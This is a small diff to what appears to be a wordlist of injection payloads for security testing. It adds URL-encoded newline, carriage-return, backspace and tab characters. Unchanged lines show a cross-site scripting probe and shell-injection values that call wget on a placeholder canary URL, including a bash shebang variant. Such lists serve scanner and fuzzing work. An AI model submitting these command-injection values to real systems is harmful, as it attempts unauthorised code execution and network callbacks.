@@ -54,6 +54,10 @@ xsstest'"><
 ${wget @canary_url}
 %00
 %a0
+%0a
+%0d
+%08
+%09
 @canary_url
 {base}"}{
 #!/bin/bash%a0wget%20@canary_url
